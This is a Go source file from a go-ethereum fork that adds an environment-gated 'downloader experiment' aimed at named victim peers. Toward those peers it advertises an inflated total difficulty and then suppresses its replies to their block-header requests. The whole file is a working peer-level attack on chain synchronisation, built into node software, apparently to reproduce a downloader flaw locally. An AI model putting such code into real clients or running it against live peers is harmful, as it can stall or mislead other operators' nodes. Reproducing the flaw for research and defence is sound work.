// Copyright 2026 The go-ethereum Authors
// This file is part of the go-ethereum library.

package eth

import (
	"errors"
	"fmt"
	"math/big"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/scroll-tech/go-ethereum/log"
)

const (
	scrollExperimentEnabledEnv  = "SCROLL_DOWNLOADER_EXPERIMENT_ENABLED"
	scrollExperimentNetworkEnv  = "SCROLL_DOWNLOADER_EXPERIMENT_NETWORK_ID"
	scrollExperimentVictimsEnv  = "SCROLL_DOWNLOADER_EXPERIMENT_VICTIM_IDS"
	scrollExperimentTDOffsetEnv = "SCROLL_DOWNLOADER_EXPERIMENT_TD_OFFSET"
	scrollExperimentAfterEnv    = "SCROLL_DOWNLOADER_EXPERIMENT_AFTER_REQUESTS"
	scrollExperimentMaxEnv      = "SCROLL_DOWNLOADER_EXPERIMENT_MAX_TRIGGERS"
)

type scrollExperimentConfig struct {
	networkID     uint64
	victims       map[string]struct{}
	tdOffset      *big.Int
	afterRequests uint64
	maxTriggers   uint64
	requests      atomic.Uint64
	triggers      atomic.Uint64
	active        sync.Map
}

var (
	scrollExperimentOnce sync.Once
	scrollExperiment     *scrollExperimentConfig
)

func getScrollExperiment() *scrollExperimentConfig {
	scrollExperimentOnce.Do(func() {
		cfg, err := loadScrollExperiment(os.Getenv)
		if err != nil {
			log.Error("Scroll downloader experiment configuration rejected; experiment disabled", "err", err)
			return
		}
		if cfg != nil {
			scrollExperiment = cfg
			log.Warn("Scroll local downloader experiment enabled", "network", cfg.networkID, "victims", len(cfg.victims), "tdOffset", cfg.tdOffset)
		}
	})
	return scrollExperiment
}

func loadScrollExperiment(getenv func(string) string) (*scrollExperimentConfig, error) {
	enabledText := strings.TrimSpace(getenv(scrollExperimentEnabledEnv))
	enabled, err := strconv.ParseBool(enabledText)
	if err != nil && enabledText != "" {
		return nil, fmt.Errorf("invalid %s: %w", scrollExperimentEnabledEnv, err)
	}
	if !enabled {
		return nil, nil
	}
	cfg := &scrollExperimentConfig{victims: make(map[string]struct{}), tdOffset: new(big.Int)}
	cfg.networkID, err = strconv.ParseUint(strings.TrimSpace(getenv(scrollExperimentNetworkEnv)), 10, 64)
	if err != nil || cfg.networkID == 0 {
		return nil, fmt.Errorf("%s must be a non-zero decimal network ID", scrollExperimentNetworkEnv)
	}
	for _, value := range strings.Split(getenv(scrollExperimentVictimsEnv), ",") {
		if id := normalizeScrollExperimentID(value); id != "" {
			cfg.victims[id] = struct{}{}
		}
	}
	if len(cfg.victims) == 0 {
		return nil, fmt.Errorf("%s must contain an exact victim node ID", scrollExperimentVictimsEnv)
	}
	offset := strings.TrimSpace(getenv(scrollExperimentTDOffsetEnv))
	if offset == "" {
		offset = "10000000"
	}
	if _, ok := cfg.tdOffset.SetString(offset, 10); !ok || cfg.tdOffset.Sign() <= 0 {
		return nil, fmt.Errorf("%s must be a positive decimal integer", scrollExperimentTDOffsetEnv)
	}
	if cfg.afterRequests, err = parseScrollExperimentUint(getenv(scrollExperimentAfterEnv)); err != nil {
		return nil, err
	}
	if cfg.maxTriggers, err = parseScrollExperimentUint(getenv(scrollExperimentMaxEnv)); err != nil {
		return nil, err
	}
	return cfg, nil
}

func parseScrollExperimentUint(value string) (uint64, error) {
	value = strings.TrimSpace(value)
	if value == "" {
		return 0, nil
	}
	return strconv.ParseUint(value, 10, 64)
}

func normalizeScrollExperimentID(value string) string {
	id := strings.TrimPrefix(strings.ToLower(strings.TrimSpace(value)), "enode://")
	if at := strings.IndexByte(id, '@'); at >= 0 {
		id = id[:at]
	}
	return id
}

func (cfg *scrollExperimentConfig) targets(peer *Peer) bool {
	if cfg == nil || peer == nil {
		return false
	}
	_, ok := cfg.victims[normalizeScrollExperimentID(peer.ID())]
	return ok
}

func scrollExperimentAdvertisedTD(peer *Peer, networkID uint64, td *big.Int) *big.Int {
	cfg := getScrollExperiment()
	if cfg == nil || cfg.networkID != networkID || !cfg.targets(peer) || td == nil {
		return td
	}
	advertised := new(big.Int).Add(new(big.Int).Set(td), cfg.tdOffset)
	if advertised.BitLen() > 100 {
		return td
	}
	cfg.active.Store(normalizeScrollExperimentID(peer.ID()), struct{}{})
	peer.Log().Warn("Scroll experiment advertising offset TD", "realTD", td, "advertisedTD", advertised, "offset", cfg.tdOffset)
	return advertised
}

func scrollExperimentSuppressHeaders(peer *Peer, query *GetBlockHeadersPacket66) (bool, error) {
	cfg := getScrollExperiment()
	if cfg == nil || !cfg.targets(peer) {
		return false, nil
	}
	if _, ok := cfg.active.Load(normalizeScrollExperimentID(peer.ID())); !ok {
		return false, nil
	}
	request := cfg.requests.Add(1)
	if request <= cfg.afterRequests {
		return false, nil
	}
	if query == nil || query.GetBlockHeadersPacket == nil {
		return false, errors.New("Scroll experiment received nil header query")
	}
	for {
		current := cfg.triggers.Load()
		if cfg.maxTriggers > 0 && current >= cfg.maxTriggers {
			return false, nil
		}
		if cfg.triggers.CompareAndSwap(current, current+1) {
			break
		}
	}
	peer.Log().Warn("Scroll experiment suppressing header response", "requestID", query.RequestId, "originNumber", query.Origin.Number, "requestNumber", request)
	return true, nil
}
